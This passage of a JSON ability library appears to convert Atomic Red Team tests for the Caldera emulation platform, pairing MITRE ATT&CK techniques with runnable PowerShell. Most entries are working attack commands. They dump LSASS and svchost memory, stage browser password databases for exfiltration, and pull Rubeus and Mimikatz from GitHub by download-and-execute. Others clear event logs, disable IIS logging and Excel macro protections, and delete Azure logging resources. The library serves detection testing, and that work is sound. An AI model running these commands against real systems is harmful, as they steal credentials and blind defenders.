            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\Profiles\" -Force -ErrorAction Ignore -Recurse",
                    "command": "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\\\" -Destination \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Force -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "679ef375ad2b361965500392419d084c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "679ef375ad2b361965500392419d084c"
    },
    "T1555__credential-access__Credentials from Password Stores__f5606cc7632289d5ca72d4a485c14f6b": {
        "description": "This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555",
            "name": "Credentials from Password Stores"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "vaultcmd /listcreds:\"Web Credentials\" /all",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f5606cc7632289d5ca72d4a485c14f6b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f5606cc7632289d5ca72d4a485c14f6b"
    },
    "T1558.003__credential-access__Steal or Forge Kerberos Tickets: Kerberoasting__5e3512c73a461c17ddcb1cc0bbdbeef9": {
        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1558.003",
            "name": "Steal or Forge Kerberos Tickets: Kerberoasting"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command \"kerberoast /format:hashcat /nowrap\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5e3512c73a461c17ddcb1cc0bbdbeef9",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "5e3512c73a461c17ddcb1cc0bbdbeef9"
    },
    "T1555.003__credential-access__Credentials from Password Stores: Credentials from Web Browsers__56c2f2d8b48bcb1c999d4e8929bd8d9b": {
        "description": "This test is designed to search a drive for credential files used by the most common web browsers on Windows (Firefox, Chrome, Opera, and Edge), export the found files to a folder, and zip it,\nsimulating how an adversary might stage sensitive credential files for exfiltration in order to conduct offline password extraction with tools like [firepwd.py](https://github.com/lclevy/firepwd) or [HackBrowserData](https://github.com/moonD4rk/HackBrowserData). \n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1555.003",
            "name": "Credentials from Password Stores: Credentials from Web Browsers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path \"$env:temp\\T1555.003.zip\" -force -erroraction silentlycontinue   ; Remove-Item -Path \"$env:temp\\T1555.003\\\" -force -recurse -erroraction silentlycontinue",
                    "command": "$exfil_folder = \"$env:temp\\T1555.003\"; if (test-path \"$exfil_folder\") {} else {new-item -path \"$env:temp\" -Name \"T1555.003\" -ItemType \"directory\" -force}; $FirefoxCredsLocation = get-childitem -path \"$env:appdata\\Mozilla\\Firefox\\Profiles\\*.default-release\\\"; if (test-path \"$FirefoxCredsLocation\\key4.db\") {copy-item \"$FirefoxCredsLocation\\key4.db\" -destination \"$exfil_folder\\T1555.003Firefox_key4.db\"} else {}; if (test-path \"$FirefoxCredsLocation\\logins.json\") {copy-item \"$FirefoxCredsLocation\\logins.json\" -destination \"$exfil_folder\\T1555.003Firefox_logins.json\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data\"} else {}; if (test-path \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\") {copy-item \"$env:localappdata\\Google\\Chrome\\User Data\\Default\\Login Data For Account\" -destination \"$exfil_folder\\T1555.003Chrome_Login Data For Account\"} else {}; if (test-path \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\") {copy-item \"$env:appdata\\Opera Software\\Opera Stable\\Login Data\" -destination \"$exfil_folder\\T1555.003Opera_Login Data\"} else {}; if (test-path \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\") {copy-item \"$env:localappdata/Microsoft/Edge/User Data/Default/Login Data\" -destination \"$exfil_folder\\T1555.003Edge_Login Data\"} else {} ; compress-archive -path \"$exfil_folder\" -destinationpath \"$exfil_folder.zip\" -force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "56c2f2d8b48bcb1c999d4e8929bd8d9b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "56c2f2d8b48bcb1c999d4e8929bd8d9b"
    },
    "T1552.004__credential-access__Unsecured Credentials: Private Keys__f7257d271a176f7c609b4a33513d2eef": {
        "description": "Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet.\nUpon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.004",
            "name": "Unsecured Credentials: Private Keys"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {; $cert = Import-Certificate -FilePath $env:Temp\\atomicredteam.pfx -CertStoreLocation Cert:\\LocalMachine\\My; Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; } catch { }",
                    "command": "$mypwd = ConvertTo-SecureString -String \"AtomicRedTeam\" -Force -AsPlainText; $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\\LocalMachine\\My; Set-Location Cert:\\LocalMachine\\My; Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath $env:Temp\\atomicredteam.pfx -Password $mypwd",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f7257d271a176f7c609b4a33513d2eef",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f7257d271a176f7c609b4a33513d2eef"
    },
    "T1003.001__credential-access__OS Credential Dumping: LSASS Memory__35d92515122effdd73801c6ac3021da7": {
        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003.001",
            "name": "OS Credential Dumping: LSASS Memory"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\lsass-comsvcs.dmp -ErrorAction Ignore",
                    "command": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "35d92515122effdd73801c6ac3021da7",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "35d92515122effdd73801c6ac3021da7"
    },
    "T1552.006__credential-access__Unsecured Credentials: Group Policy Preferences__e93d024cd93ceaaf880d6f799ef1c9c8": {
        "description": "Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.\nThis test is intended to be run from a domain joined workstation, not on the Domain Controller itself.\nThe Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.\n\nSuccessful test execution will either display the credentials found in the GPP files or indicate \"No preference files found\".\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1552.006",
            "name": "Unsecured Credentials: Group Policy Preferences"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": ". \"PathToAtomicsFolder\\..\\ExternalPayloads\\Get-GPPPassword.ps1\"; Get-GPPPassword -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e93d024cd93ceaaf880d6f799ef1c9c8",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "e93d024cd93ceaaf880d6f799ef1c9c8"
    },
    "T1003__credential-access__OS Credential Dumping__18f31c311ac208802e88ab8d5af8603e": {
        "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n",
        "tactic": "credential-access",
        "technique": {
            "attack_id": "T1003",
            "name": "OS Credential Dumping"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\svchost-exe.dmp -ErrorAction Ignore",
                    "command": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore); if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }; C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "18f31c311ac208802e88ab8d5af8603e",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "18f31c311ac208802e88ab8d5af8603e"
    },
    "T1566.001__initial-access__Phishing: Spearphishing Attachment__1afaec09315ab71fdfb167175e8a019a": {
        "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1566.001",
            "name": "Phishing: Spearphishing Attachment"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\PhishingAttachment.xlsm -ErrorAction Ignore",
                    "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1afaec09315ab71fdfb167175e8a019a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "1afaec09315ab71fdfb167175e8a019a"
    },
    "T1566.001__initial-access__Phishing: Spearphishing Attachment__0a69420bec84b02bd47464f6835653b1": {
        "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
        "tactic": "initial-access",
        "technique": {
            "attack_id": "T1566.001",
            "name": "Phishing: Spearphishing Attachment"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Users\\Public\\art.jse -ErrorAction Ignore",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0a69420bec84b02bd47464f6835653b1",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0a69420bec84b02bd47464f6835653b1"
    },
    "T1070.006__defense-evasion__Indicator Removal on Host: Timestomp__f1dcadde207fafe338ae3eb48805f23c": {
        "description": "Modifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.006",
            "name": "Indicator Removal on Host: Timestomp"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f1dcadde207fafe338ae3eb48805f23c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "f1dcadde207fafe338ae3eb48805f23c"
    },
    "T1027__defense-evasion__Obfuscated Files or Information__fd4ca8f12c6d3a9af55be0211878509b": {
        "description": "The following Atomic Test will create a file with a specific name and sets its attributes to Hidden, System, and Archive. This was related to the Snake Malware campaign and is later decrypted by Snake's kernel driver.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1027",
            "name": "Obfuscated Files or Information"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$fileNameToDelete = '04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog'; $filePathToDelete = \"$env:windir\\registration\\\"; $fullPathToDelete = Join-Path $filePathToDelete $fileNameToDelete; if (Test-Path $fullPathToDelete) { Remove-Item -Path $fullPathToDelete -Force; Write-Host \"File deleted: $fullPathToDelete\" } else { Write-Host \"File not found: $fullPathToDelete\" }",
                    "command": "$file = New-Item $env:windir\\registration\\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host \"File created: $($file.FullName)\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fd4ca8f12c6d3a9af55be0211878509b",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "fd4ca8f12c6d3a9af55be0211878509b"
    },
    "T1553.004__defense-evasion__Subvert Trust Controls: Install Root Certificate__2cdcf1010a524231a26b5f3c6025eb91": {
        "description": "Creates a root CA with certutil\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1553.004",
            "name": "Subvert Trust Controls: Install Root Certificate"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "try {; $cert = Import-Certificate -FilePath $env:Temp\\rootCA2.cer -CertStoreLocation Cert:\\LocalMachine\\My; Get-ChildItem Cert:\\LocalMachine\\My\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; Get-ChildItem Cert:\\LocalMachine\\Root\\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore; } catch { }",
                    "command": "certutil -addstore my $env:Temp\\rootCA2.cer",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2cdcf1010a524231a26b5f3c6025eb91",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "2cdcf1010a524231a26b5f3c6025eb91"
    },
    "T1070.001__defense-evasion__Indicator Removal on Host: Clear Windows Event Logs__05f8b752dbccff102ef530103bd8e550": {
        "description": "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.001",
            "name": "Indicator Removal on Host: Clear Windows Event Logs"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\" -officeProduct \"Word\" -sub \"ClearLogs\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "05f8b752dbccff102ef530103bd8e550",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "05f8b752dbccff102ef530103bd8e550"
    },
    "T1218.005__defense-evasion__Signed Binary Proxy Execution: Mshta__0bb6fa90a458e6512a19d246cfae8843": {
        "description": "Executes an HTA Application with JScript Engine, Rundll32 and Inline Protocol Handler.",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.005",
            "name": "Signed Binary Proxy Execution: Mshta"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable; if (-not $RequiredModule) {Install-Module -Name AtomicTestHarnesses -Scope CurrentUser -Force};  ;  Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\\system32\\rundll32.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0bb6fa90a458e6512a19d246cfae8843",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "0bb6fa90a458e6512a19d246cfae8843"
    },
    "T1620__defense-evasion__Reflective Code Loading__aa758d17faffeeb69c56481340891859": {
        "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1620",
            "name": "Reflective Code Loading"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "aa758d17faffeeb69c56481340891859",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "aa758d17faffeeb69c56481340891859"
    },
    "T1562.002__defense-evasion__Impair Defenses: Disable Windows Event Logging__7a0717485ca13c441d26bfaaa5c92535": {
        "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.002",
            "name": "Impair Defenses: Disable Windows Event Logging"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "if(Test-Path \"C:\\Windows\\System32\\inetsrv\\appcmd.exe\"){;   C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:false *>$null; }",
                    "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7a0717485ca13c441d26bfaaa5c92535",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "7a0717485ca13c441d26bfaaa5c92535"
    },
    "T1218.004__defense-evasion__Signed Binary Proxy Execution: InstallUtil__9eb61c26282c5b324e1fb6cceeefc445": {
        "description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1218.004",
            "name": "Signed Binary Proxy Execution: InstallUtil"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore",
                    "command": "if (Test-Path \"eaecbe_InstallUtilTestHarness.ps1\") { ; } else {New-Item -Type Directory (split-path \"eaecbe_InstallUtilTestHarness.ps1\") -ErrorAction ignore | Out-Null; Invoke-WebRequest 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' -OutFile \"eaecbe_InstallUtilTestHarness.ps1\"};  ; . \"eaecbe_InstallUtilTestHarness.ps1\"; $InstallerAssemblyDir = \"$Env:TEMP\\\"; $InstallerAssemblyFileName = \"T1218.004.dll\"; $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; $CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"; $ExpectedOutput = 'Constructor_Install_'; $TestArgs = @{;     OutputAssemblyDirectory = $InstallerAssemblyDir;     OutputAssemblyFileName = $InstallerAssemblyFileName;     InvocationMethod = 'Executable';     CommandLine = $CommandLine; }; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw @\"; InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.; Expected: $ExpectedOutput; Actual: $ActualOutput; \"@; }",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "eaecbe_InstallUtilTestHarness.ps1"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "9eb61c26282c5b324e1fb6cceeefc445",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "9eb61c26282c5b324e1fb6cceeefc445"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__04858322bc6cd08282f2ce96cab5ee7c": {
        "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -path $env:TEMP\\deleteme_T1551.004",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "04858322bc6cd08282f2ce96cab5ee7c",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "04858322bc6cd08282f2ce96cab5ee7c"
    },
    "T1562.008__defense-evasion__Impair Defenses: Disable Cloud Logs__81f547e5490f66c5e2540cda92a7e47a": {
        "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.008",
            "name": "Impair Defenses: Disable Cloud Logs"
        },
        "platforms": {
            "unknown": {
                "psh": {
                    "cleanup": "cd \"$PathToAtomicsFolder/T1562.008/src/T1562.008-2/\"; terraform destroy -auto-approve",
                    "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd; Connect-AzureAD -Credential $creds; Remove-AzEventHub -ResourceGroupName",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "81f547e5490f66c5e2540cda92a7e47a",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "81f547e5490f66c5e2540cda92a7e47a"
    },
    "T1070.004__defense-evasion__Indicator Removal on Host: File Deletion__36aa805044ab4f4d7f6f372a46c8bab2": {
        "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1070.004",
            "name": "Indicator Removal on Host: File Deletion"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "36aa805044ab4f4d7f6f372a46c8bab2",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "36aa805044ab4f4d7f6f372a46c8bab2"
    },
    "T1562.001__defense-evasion__Impair Defenses: Disable or Modify Tools__b66a6eed7d46ab2ca4c3bf1ae3b61f44": {
        "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "tactic": "defense-evasion",
        "technique": {
            "attack_id": "T1562.001",
            "name": "Impair Defenses: Disable or Modify Tools"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -ErrorAction Ignore | Out-Null; Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -ErrorAction Ignore",
                    "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"; New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"; New-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b66a6eed7d46ab2ca4c3bf1ae3b61f44",
            "None",
            "validate_me",
            "atomic"
        ],
        "plugin": "atomic",
        "caldera_ability_id": "b66a6eed7d46ab2ca4c3bf1ae3b61f44"
    },
